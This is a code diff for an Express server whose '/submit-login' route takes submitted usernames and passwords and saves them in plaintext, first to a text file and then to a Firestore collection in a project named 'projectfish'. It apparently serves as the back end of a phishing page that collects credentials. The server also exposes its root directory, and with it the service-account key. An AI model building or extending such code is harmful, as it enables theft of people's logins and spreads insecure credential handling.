@@ -2,27 +2,39 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const fs = require('fs');
 const path = require('path');
+const admin = require('firebase-admin');
+
+// Initialize Firebase Admin SDK
+const serviceAccount = require('serviceAccountKey.json'); // Update this path
+admin.initializeApp({
+    credential: admin.credential.cert(serviceAccount),
+    databaseURL: "https://projectfish-99658.firebaseio.com" // Replace YOUR_PROJECT_ID
+});
+
+const db = admin.firestore();
 
 const app = express();
 const PORT = process.env.PORT || 3000; // Use Render's PORT environment variable
 
 // Middleware to parse form data
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(__dirname)); // Serve static files from the "public" directory
+app.use(express.static(__dirname)); // Serve static files from the root directory
 
 // Route to handle login form submission
-app.post('/submit-login', (req, res) => {
+app.post('/submit-login', async (req, res) => {
     const { username, password } = req.body;
-    const data = `Username: ${username}, Password: ${password}\n`; // Format the data to save
 
-    // Append data to a text file
-    fs.appendFile(path.join(__dirname, 'login_data.txt'), data, (err) => {
-        if (err) {
-            console.error('Error writing to file', err);
-            return res.status(500).send('Error saving data.');
-        }
-        res.send('Login information saved successfully.');
-    });
+    try {
+        // Save user data to Firestore
+        await db.collection('users').add({
+            username: username,
+            password: password // Note: Store passwords securely (hashed) in production!
+        });
+        res.send('User data saved successfully.');
+    } catch (error) {
+        console.error('Error saving data:', error);
+        res.status(500).send('Error saving data: ' + error);
+    }
 });
 
 // Route to serve the homepage
